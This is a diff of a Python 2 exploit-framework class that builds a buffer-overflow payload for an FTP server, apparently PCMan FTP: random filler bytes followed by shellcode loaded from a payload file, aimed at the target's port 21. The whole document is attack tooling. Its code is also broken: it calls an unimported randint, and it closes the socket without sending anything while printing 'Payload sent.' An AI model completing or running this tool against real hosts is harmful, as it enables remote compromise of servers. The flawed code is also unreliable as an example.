@@ -1,14 +1,21 @@
 class Exploit(cmd.Cmd):
-  def __init__(self):
+  def __init__(self, variables, descriptions, name, target, payload):
     cmd = __import__("cmd")
     cmd.Cmd.__init__(self)
     self.os = __import__("os")
     self.ftplib = __import__("ftplib")
     _tmp = __import__("random", globals(), locals(), ['randint'])
-    self.variables = {"":""}
-    self.descriptions = {"":""}
-    self.name = [""]
-    self.target = [""] 
+    self.randint = _tmp.randint
+    _tmp = __import__("socket", globals(), locals(), ['socket', 'AF_INET', 'SOCK_STREAM', 'gethostbyname'])
+    self.socket = _tmp.socket
+    self.AF_INET = _tmp.AF_INET
+    self.SOCK_STREAM = _tmp.SOCK_STREAM
+    self.gethostbyname = _tmp.gethostbyname
+    self.variables = variables #{"":""}  list of variables
+    self.descriptions = descriptions #{"":""} descriptions
+    self.name =  name #[""] name of exploit
+    self.target = target #[""] target ex: Windows 7 SP1 x86
+    self.payload =  payload #[""] name of payload
   def help_help(self):
     print "Usage: help [cmd]"
     print "cmd    the command to get help on"
@@ -53,20 +60,21 @@ class Exploit(cmd.Cmd):
     print "start: start the attack"
   def do_start(self, args):
     for let in "abcdefghijklmnopqrstuvwxyz":
-      if let in self.host[0]:
-        self.variables["host"] = gethostbyname(self.variables["host"])
+      if let in self.variables["host"]:
+        self.variables["host"] = self.gethostbyname(self.variables["host"])
     print "[*]Generating payload..."
     char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
     payload = ""
     for a in range(0, 2017):
-      payload += "\x" + char[randint(0, 16)] + char[randint(0, 16)]
-    f = open("../../../payloads/pcman_put.shell", "r")
+      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
+      payload += tmp.decode('string_escape')
+    f = open("../../../payloads/%s.shell" % self.payload, "r")
     for line in f.readlines():
       payload += line[:-1].decode('string_escape')
     f.close()
     print "[+]Payload generated."
     print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
-    s = socket(AF_INET, SOCK_STREAM)
+    s = self.socket(self.AF_INET, self.SOCK_STREAM)
     s.connect((self.variables["host"], 21))
     s.close()
     print "[+]Payload sent."
